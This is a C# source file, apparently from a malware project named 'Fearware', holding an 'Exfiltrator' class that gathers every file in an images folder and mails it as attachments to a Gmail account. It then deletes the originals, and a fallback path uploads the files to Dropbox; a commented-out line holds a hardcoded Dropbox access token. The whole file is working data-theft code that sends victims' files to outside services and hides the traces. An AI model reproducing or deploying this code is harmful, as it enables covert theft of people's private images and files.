

using Dropbox.Api;
using Dropbox.Api.Files;
using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Mail;
using System.Collections.Specialized;
using System.Configuration;

namespace Fearware
{
    public static class Exfiltrator
    {
        private static string[] imagesList;
        private static NameValueCollection secretSection = (NameValueCollection)ConfigurationManager.GetSection("localSecrets");

        public static void Start(string imagesPath)
        {

            //Dropbox attempt
            //ServicePointManager.ServerCertificateValidationCallback += ValidateRemoteCertificate;
            //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            //string token = "Ip1pe_wWzzkAAAAAAAAAAd5wNGyo7RlW8F0jib_WbAV-5SxozVRqNgf_iuYfoxQ5";
            string[] imagesList = Directory.GetFiles(imagesPath);

            try
            {
                
                    
                int endList = imagesList.Length - 1;
                if (email_send(imagesList) == 0)
                {
                    DeleteFile(imagesList);
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
            Console.WriteLine("finito");
        }

        public static int email_send(string[] imagesList)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress(Core.Base64Decode((string)Core.GetCredJson()["username"], Environment.MachineName));
                mail.To.Add(Core.Base64Decode((string)Core.GetCredJson()["username"], Environment.MachineName));
                mail.Subject = "Exfiltered data from "+Environment.MachineName;
                mail.Body = "mail with attachment";

                int endList = imagesList.Length - 1;
                for (int i = 0; i<= endList; i++) {
                    AddAttachment(imagesList[i], mail);
                }


                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential(Core.Base64Decode((string)Core.GetCredJson()["username"], Environment.MachineName), Core.Base64Decode((string)Core.GetCredJson()["password"], Environment.MachineName));
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);

                
                mail.Dispose();
                Console.WriteLine("spedita");
                return 0;
            }
            catch {
                Console.WriteLine("errore");
                return -1;
            }


        }

        private static void AddAttachment(string v, MailMessage mail)
        {
            System.Net.Mail.Attachment attachment;
            using (FileStream file = File.OpenRead(v))
            {
                attachment = new System.Net.Mail.Attachment(v);
                mail.Attachments.Add(attachment);
                file.Dispose();
            }
            
        }

        public static void DeleteFile(string[] imagesList)
        {
            int i = 0;
            for (; i <= imagesList.Length - 1; i++)
            {
                File.Delete(imagesList[i]);
            }

        }


        //attempt through Dropbox API 
        private static async Task Upload(DropboxClient dbx, string file, string fileToUpload)
        {
            using (var mem = new MemoryStream(File.ReadAllBytes(fileToUpload)))
            {
                var updated = await dbx.Files.UploadAsync(
                    "/" + file,
                    WriteMode.Overwrite.Instance,
                    body: mem);
                Console.WriteLine("Saved {0} rev {1}", file, updated.Rev);
            }
        }

        //attempt through Dropbox API 
        public static Action<int> FileUploadToDropbox(string s, string token)
        {
            try
            {

                string uri = @"https://content.dropboxapi.com/2/files/upload";
                Uri uri1 = new Uri(uri);
                string name = s.Split('\\')[s.Split('\\').Length - 1].Split('.')[0];
                Console.WriteLine(name);
                WebClient myWebClient = new WebClient();
                myWebClient.Headers[HttpRequestHeader.ContentType] = "application/octet-stream";
                myWebClient.Headers[HttpRequestHeader.Authorization] = "Bearer " + token;
                myWebClient.Headers.Add($"Dropbox-API-Arg: {{\"path\":\"/{name}\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}}");
                byte[] buffer;
                using (var fileStream = new FileStream(s, FileMode.Open, FileAccess.Read))
                {
                    int length = (int)fileStream.Length;
                    buffer = new byte[length];
                    fileStream.Read(buffer, 0, length);
                }
                byte[] request = myWebClient.UploadData(uri1, "POST", buffer);
                var Result = System.Text.Encoding.Default.GetString(request);
                return null;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }

        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
        {
            if (error == System.Net.Security.SslPolicyErrors.None)
            {
                return true;
            }
            Console.WriteLine("X509Certificate [{0}] Policy Error: '{1}'",
                cert.Subject,
                error.ToString());
            return false;
        }
    }

}
